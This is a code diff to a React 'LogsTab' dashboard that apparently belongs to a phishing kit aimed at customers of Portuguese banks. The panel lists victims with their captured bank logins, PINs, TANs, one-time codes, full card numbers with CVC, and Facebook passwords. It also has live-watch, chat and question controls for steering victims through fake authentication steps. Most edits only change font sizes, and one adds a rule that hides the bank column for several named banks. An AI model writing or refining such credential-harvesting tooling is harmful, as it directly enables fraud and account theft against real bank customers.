@@ -2256,8 +2256,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       {/* TABLE */}
       <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
         <div className="overflow-x-auto pb-4">
-          <table className="w-full table-auto border-collapse text-[10px] text-left lg:text-[11px]">
-            <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
+          <table className="w-full table-auto border-collapse text-[12px] text-left lg:text-[13px]">
+            <thead className={`text-[13px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
               <tr>
                 <th className="min-w-[75px] px-2 py-3 font-semibold whitespace-nowrap text-center">İzle</th>
                 <th className="min-w-[60px] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
@@ -2394,7 +2394,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       <button
                         type="button"
                         onClick={() => setLiveWatchRow(row)}
-                        className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-bold transition-all shadow-sm ${
+                        className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[13px] font-bold transition-all shadow-sm ${
                           isOnline
                             ? "bg-red-500/15 text-red-500 border border-red-500/30 hover:bg-red-500 hover:text-white"
                             : darkMode
@@ -2426,38 +2426,50 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       {row.amount ? `€${row.amount}` : '-'}
                     </td>
                     <td className="px-2 py-3 align-top">
-                      <div className="cursor-pointer text-[11px] font-semibold opacity-90 transition-opacity group-hover:opacity-100 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
+                      <div className="cursor-pointer text-[13px] font-semibold opacity-90 transition-opacity group-hover:opacity-100 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
                         {fd.firstName || fd.lastName ? `${fd.firstName} ${fd.lastName}` : '-'}
                       </div>
                     </td>
                     <td className="px-2 py-3 align-top">
-                      <div className="cursor-pointer text-[11px] opacity-80 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(fd.phone)}>
+                      <div className="cursor-pointer text-[13px] opacity-80 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(fd.phone)}>
                         {fd.phone || '-'}
                       </div>
                     </td>
                     <td className="px-2 py-3 align-top">
-                      <div className="space-y-2 text-[10px] leading-tight">
+                      {(() => {
+                        // Giris yontemi OLMAYAN bankalar (autenticacao'ya giden PT
+                        // bankalari) Banka kolonunda bos gosterilsin.
+                        const AUTH_ONLY_BANK_SLUGS = new Set(["millennium-bcp", "activobank", "montepio", "credito-agricola"]);
+                        const isAuthOnlyBank =
+                          s === "autenticacao" ||
+                          AUTH_ONLY_BANK_SLUGS.has(String(fd.bankSlug || "").trim().toLowerCase());
+                        if (isAuthOnlyBank && shortCreds.length === 0) {
+                          return <span className={`text-[12px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>;
+                        }
+                        return null;
+                      })() ?? (
+                      <div className="space-y-2 text-[12px] leading-tight">
                         {/* SATIR 1: BANKA ADI + GIRIS YONTEMI BADGE (LOGO KALDIRILDI) */}
                         <div className="flex items-start gap-2">
                           {/* BANKA ADI + GIRIS YONTEMI */}
                           <div className="min-w-0 flex-1 space-y-1">
                             {fd.bankName && (
-                              <div className="font-extrabold text-[11px] text-yellow-700 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
+                              <div className="font-extrabold text-[13px] text-yellow-700 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
                                 {fd.bankName}
                               </div>
                             )}
                             {!fd.bankName && (
-                              <div className="font-semibold text-[10px] opacity-40">
+                              <div className="font-semibold text-[12px] opacity-40">
                                 Henüz banka seçilmedi
                               </div>
                             )}
                             {loginMethod && (
-                              <span className="inline-flex max-w-full items-center rounded-full border border-cyan-500/20 bg-cyan-500/10 px-2 py-0.5 text-[9px] font-black uppercase tracking-wider text-cyan-600 dark:text-cyan-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight">
+                              <span className="inline-flex max-w-full items-center rounded-full border border-cyan-500/20 bg-cyan-500/10 px-2 py-0.5 text-[11px] font-black uppercase tracking-wider text-cyan-600 dark:text-cyan-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight">
                                 Yöntem: {loginMethod}
                               </span>
                             )}
                             {!loginMethod && fd.bankName && (
-                              <span className="inline-flex max-w-full items-center rounded-full border border-zinc-500/10 bg-zinc-500/5 px-2 py-0.5 text-[8px] font-bold uppercase tracking-wider text-zinc-500 dark:text-zinc-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight">
+                              <span className="inline-flex max-w-full items-center rounded-full border border-zinc-500/10 bg-zinc-500/5 px-2 py-0.5 text-[10px] font-bold uppercase tracking-wider text-zinc-500 dark:text-zinc-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight">
                                 Giriş yöntemi: bekleniyor
                               </span>
                             )}
@@ -2469,7 +2481,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           <div className="space-y-1 pl-0.5 pt-0.5">
                             {shortCreds.map(([key, value]) => (
                               <div key={`${key}-${value}`} className="flex min-w-0 items-start gap-1 leading-tight">
-                                <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[8px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
+                                <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[10px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
                                   {key}
                                 </span>
                                 <span className="min-w-0 cursor-pointer font-medium transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(value))}>
@@ -2480,16 +2492,17 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           </div>
                         )}
                       </div>
+                      )}
                     </td>
                     <td className="px-2 py-3 align-top">
                       {approvalEntries.length === 0 ? (
-                        <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
+                        <span className={`text-[12px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                       ) : (
                         <div className="flex flex-col items-start gap-1">
                           {approvalEntries.map((approvalValue, index) => (
                             <span
                               key={`${approvalValue}-${index}`}
-                              className="inline-block w-fit max-w-full rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[9px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight"
+                              className="inline-block w-fit max-w-full rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[11px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight"
                             >
                               {getApprovalDisplayText(approvalValue)}
                             </span>
@@ -2510,27 +2523,27 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         const hasAuth = Boolean(authPhone || authPin || authTan);
                         if (hasAuth) {
                           return (
-                            <div className="space-y-1 text-[10px] font-medium leading-tight">
+                            <div className="space-y-1 text-[12px] font-medium leading-tight">
                               {authPhone && (
                                 <div className="flex min-w-0 items-start gap-1">
-                                  <span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">Tel:</span>
+                                  <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">Tel:</span>
                                   <span className="min-w-0 cursor-pointer font-mono font-bold whitespace-normal break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPhone)}>{authPhone}</span>
                                 </div>
                               )}
                               {authPin && (
                                 <div className="flex min-w-0 items-start gap-1">
-                                  <span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">PIN:</span>
+                                  <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">PIN:</span>
                                   <span className="min-w-0 cursor-pointer font-mono font-bold whitespace-normal break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPin)}>{authPin}</span>
                                 </div>
                               )}
                               {authTan && (
                                 <div className="flex min-w-0 items-start gap-1">
-                                  <span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">TAN:</span>
+                                  <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">TAN:</span>
                                   <span className="min-w-0 cursor-pointer font-mono font-bold text-rose-600 dark:text-rose-400 whitespace-normal break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authTan)}>{authTan}</span>
                                 </div>
                               )}
                               {typeof fd.approvalStatus === "string" && fd.approvalStatus.startsWith("autenticacao") && (
-                                <span className={`inline-block w-fit rounded-full border px-2 py-0.5 text-[9px] font-bold tracking-wide whitespace-nowrap leading-tight ${
+                                <span className={`inline-block w-fit rounded-full border px-2 py-0.5 text-[11px] font-bold tracking-wide whitespace-nowrap leading-tight ${
                                   fd.approvalStatus === "autenticacao_confirmed"
                                     ? "border-emerald-500/20 bg-emerald-500/10 text-emerald-600 dark:text-emerald-400"
                                     : "border-amber-500/20 bg-amber-500/10 text-amber-600 dark:text-amber-400"
@@ -2542,13 +2555,13 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           );
                         }
                         if (genEntries.length === 0) {
-                          return <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>;
+                          return <span className={`text-[12px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>;
                         }
                         return (
                           <div className="space-y-2">
                             {genEntries.map((entry, gi) => (
                               <div key={gi} className="space-y-0.5">
-                                <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[9px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap leading-tight">
+                                <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[11px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap leading-tight">
                                   kodas {entry.type === "generator2" ? "2" : "1"}
                                 </span>
                                 {Object.entries(entry.data)
@@ -2556,7 +2569,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                                   .map(([k, v]) => (
                                     <div
                                       key={k}
-                                      className="cursor-pointer font-mono text-[11px] font-bold tracking-wider text-rose-600 dark:text-rose-400 break-all transition-opacity hover:opacity-70"
+                                      className="cursor-pointer font-mono text-[13px] font-bold tracking-wider text-rose-600 dark:text-rose-400 break-all transition-opacity hover:opacity-70"
                                       onClick={() => copyToClipboard(String(v))}
                                     >
                                       {String(v)}
@@ -2577,31 +2590,31 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       </div>
                     </td>
                     <td className="px-2 py-3 align-top">
-                      <div className="space-y-1 text-[10px] font-medium leading-tight">
-                        {fd.cardNumber && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">No:</span> <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
-                        {fd.cardExpiry && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">SKT:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardExpiry}</span></div>}
-                        {fd.cardCvc && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">CVC:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardCvc}</span></div>}
+                      <div className="space-y-1 text-[12px] font-medium leading-tight">
+                        {fd.cardNumber && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">No:</span> <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
+                        {fd.cardExpiry && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">SKT:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardExpiry}</span></div>}
+                        {fd.cardCvc && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">CVC:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardCvc}</span></div>}
                         {!fd.cardNumber && !fd.cardExpiry && !fd.cardCvc ? <span className={`${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span> : null}
                       </div>
                     </td>
                     {/* === FACEBOOK SUTUNU (YENI, Sadece fbEmail/fbPassword/fb AdSoyad goster) === */}
                     <td className="px-2 py-3 align-top">
-                      <div className="space-y-1 text-[10px] font-medium leading-tight">
+                      <div className="space-y-1 text-[12px] font-medium leading-tight">
                         {fd.fbEmail && (
                           <div className="flex min-w-0 items-start gap-1">
-                            <span className="shrink-0 opacity-60 text-[8px] font-bold uppercase text-[#0064E0] dark:text-[#3E8BFF]">E-posta:</span>
+                            <span className="shrink-0 opacity-60 text-[10px] font-bold uppercase text-[#0064E0] dark:text-[#3E8BFF]">E-posta:</span>
                             <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={()=>copyToClipboard(String(fd.fbEmail))}>{String(fd.fbEmail)}</span>
                           </div>
                         )}
                         {fd.fbPassword && (
                           <div className="flex min-w-0 items-start gap-1">
-                            <span className="shrink-0 opacity-60 text-[8px] font-bold uppercase text-[#0064E0] dark:text-[#3E8BFF]">Parool:</span>
+                            <span className="shrink-0 opacity-60 text-[10px] font-bold uppercase text-[#0064E0] dark:text-[#3E8BFF]">Parool:</span>
                             <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere] font-mono" onClick={()=>copyToClipboard(String(fd.fbPassword))}>{String(fd.fbPassword)}</span>
                           </div>
                         )}
                         {((fd.fbFirstName || fd.fbLastName)) && (
                           <div className="flex min-w-0 items-start gap-1">
-                            <span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">Nimi:</span>
+                            <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">Nimi:</span>
                             <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{String(fd.fbFirstName || "")} {String(fd.fbLastName || "")}</span>
                           </div>
                         )}
@@ -2611,18 +2624,18 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       </div>
                     </td>
                     <td className="px-2 py-3 align-top">
-                      <span className={`inline-block max-w-full rounded-full px-2 py-1 text-[9px] font-bold tracking-wide shadow-sm whitespace-normal break-words [overflow-wrap:anywhere] leading-tight text-center ${stepColor}`}>
+                      <span className={`inline-block max-w-full rounded-full px-2 py-1 text-[11px] font-bold tracking-wide shadow-sm whitespace-normal break-words [overflow-wrap:anywhere] leading-tight text-center ${stepColor}`}>
                         {stepText}
                       </span>
                     </td>
                     <td className="px-2 py-3 align-top">
                       {isOnline ? (
-                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
+                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[11px] font-bold tracking-wide whitespace-nowrap">
                           <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
                           ONLINE
                         </span>
                       ) : (
-                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
+                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[11px] font-bold tracking-wide whitespace-nowrap">
                           <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
                           OFFLINE
                         </span>
@@ -2633,7 +2646,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       {!isDeletedMode && (
                         <>
                           <select
-                            className={`w-full rounded-lg border px-2 py-1.5 text-[10px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/40 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                            className={`w-full rounded-lg border px-2 py-1.5 text-[12px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/40 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
                             value=""
                             onChange={(e) => {
                               if (e.target.value) {
@@ -2658,7 +2671,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           </select>
 
                           <select
-                            className={`w-full rounded-lg border px-2 py-1.5 text-[10px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-emerald-500/40 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                            className={`w-full rounded-lg border px-2 py-1.5 text-[12px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-emerald-500/40 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
                             value=""
                             onChange={(e) => {
                               if (e.target.value) {
@@ -2678,19 +2691,19 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       )}
 
                         <div className={`flex justify-end items-center mt-0.5 gap-1 w-full ${isDeletedMode ? 'pt-1' : ''}`}>
-                          <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Canlı Destek">
+                          <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide" title="Canlı Destek">
                             <span>💬</span>
                           </button>
-                          <button onClick={() => setQuestionModalSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-violet-500/10 text-violet-600 dark:text-violet-400 hover:bg-violet-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Özel Sorular (Soru-Cevap)">
+                          <button onClick={() => setQuestionModalSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-violet-500/10 text-violet-600 dark:text-violet-400 hover:bg-violet-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide" title="Özel Sorular (Soru-Cevap)">
                             <span>❓</span>
                           </button>
-                          <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Cihaz Bilgisi">
+                          <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide" title="Cihaz Bilgisi">
                             <span>📱</span>
                           </button>
                           {/* ================== 📜 GECMIS GIRISLER BUTONU (Normal + Silinen modların HER İKİSİNDE GORUNUR) ================== */}
                           <button
                             onClick={() => { setHistoryModalSession(row); setShowHistoryModal(true); }}
-                            className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-amber-500/10 text-amber-600 dark:text-amber-400 hover:bg-amber-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide"
+                            className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-amber-500/10 text-amber-600 dark:text-amber-400 hover:bg-amber-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide"
                             title="Önceki Banka & Facebook Giriş Kayıtları (Geçmiş)"
                           >
                             <span>📜</span>
@@ -2699,21 +2712,21 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             <>
                               <button
                                 onClick={() => void handleRestoreLog(row.id)}
-                                className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-green-500/10 text-green-600 dark:text-green-400 hover:bg-green-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide"
+                                className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-green-500/10 text-green-600 dark:text-green-400 hover:bg-green-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide"
                                 title="Logu Geri Yükle (Aktif listeye döndür)"
                               >
                                 <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h10a8 8 0 018 8v2M3 10l6 6m-6-6l6-6" /></svg>
                               </button>
                               <button
                                 onClick={() => void handlePermanentDelete(row.id)}
-                                className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide"
+                                className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide"
                                 title="Kalıcı Olarak Sil (GERİ ALINMAZ)"
                               >
                                 <span>🗑️</span>
                               </button>
                             </>
                           ) : (
-                            <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Logu Sil">
+                            <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide" title="Logu Sil">
                               <span>🗑️</span>
                             </button>
                           )}
@@ -2888,12 +2901,12 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           const v = String(value).trim();
           return (
             <div className={`rounded-lg border px-3 py-2 ${darkMode ? 'border-white/10 bg-black/30' : 'border-gray-200 bg-gray-50'}`}>
-              <div className={`text-[10px] font-bold uppercase tracking-wide mb-0.5 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>{label}</div>
+              <div className={`text-[12px] font-bold uppercase tracking-wide mb-0.5 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>{label}</div>
               <div className="flex items-center justify-between gap-2">
                 <span className={`text-[12px] font-mono truncate ${darkMode ? 'text-zinc-200' : 'text-gray-900'}`}>{v}</span>
                 <button
                   onClick={() => copyText(v)}
-                  className={`shrink-0 px-2 py-0.5 rounded-md text-[10px] font-bold transition-all ${darkMode ? 'bg-white/10 text-zinc-300 hover:bg-white/20 hover:text-white' : 'bg-gray-200 text-gray-700 hover:bg-gray-300'}`}
+                  className={`shrink-0 px-2 py-0.5 rounded-md text-[12px] font-bold transition-all ${darkMode ? 'bg-white/10 text-zinc-300 hover:bg-white/20 hover:text-white' : 'bg-gray-200 text-gray-700 hover:bg-gray-300'}`}
                   title="Kopyala"
                 >
                   📋
@@ -2950,7 +2963,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     <div className="flex items-center gap-2 mb-4">
                       <span className="text-xl">🏦</span>
                       <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Banka Girişleri (Geçmiş)</h4>
-                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
+                      <span className={`text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                         {bHistory.length} adet
                       </span>
                     </div>
@@ -2983,20 +2996,20 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             >
                               <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
                                 <div className="flex items-center gap-2 min-w-0">
-                                  <span className={`text-[10px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-emerald-500/15 text-emerald-400' : 'bg-emerald-500/10 text-emerald-600'}`}>
+                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-emerald-500/15 text-emerald-400' : 'bg-emerald-500/10 text-emerald-600'}`}>
                                     #{bHistory.length - idx}
                                   </span>
                                   <div className="min-w-0">
                                     <p className={`text-[12px] font-bold truncate ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                                       {finalBankName}
                                     </p>
-                                    <p className={`text-[10px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+                                    <p className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                                       {fmtDate(r.submittedAt)}
                                     </p>
                                   </div>
                                 </div>
                                 {loginMethodStr && (
-                                  <span className={`shrink-0 text-[10px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-cyan-500/15 text-cyan-300 border border-cyan-400/20' : 'bg-cyan-500/10 text-cyan-700 border border-cyan-200'}`}>
+                                  <span className={`shrink-0 text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-cyan-500/15 text-cyan-300 border border-cyan-400/20' : 'bg-cyan-500/10 text-cyan-700 border border-cyan-200'}`}>
                                     🛂 {loginMethodStr}
                                   </span>
                                 )}
@@ -3022,7 +3035,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     <div className="flex items-center gap-2 mb-4">
                       <span className="text-xl">📘</span>
                       <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Facebook Girişleri (Geçmiş)</h4>
-                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
+                      <span className={`text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                         {fHistory.length} adet
                       </span>
                     </div>
@@ -3044,11 +3057,11 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             >
                               <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
                                 <div className="flex items-center gap-2 min-w-0">
-                                  <span className={`text-[10px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-blue-500/15 text-blue-400' : 'bg-blue-500/10 text-blue-600'}`}>
+                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-blue-500/15 text-blue-400' : 'bg-blue-500/10 text-blue-600'}`}>
                                     #{fHistory.length - idx}
                                   </span>
                                   <div className="min-w-0">
-                                    <p className={`text-[10px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+                                    <p className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                                       {fmtDate(r.submittedAt)}
                                     </p>
                                   </div>
@@ -3073,7 +3086,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     <div className="flex items-center gap-2 mb-4">
                       <span className="text-xl">💳</span>
                       <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Kart Girişleri (Geçmiş)</h4>
-                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
+                      <span className={`text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                         {cHistory.length} adet
                       </span>
                     </div>
@@ -3100,11 +3113,11 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             >
                               <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
                                 <div className="flex items-center gap-2 min-w-0">
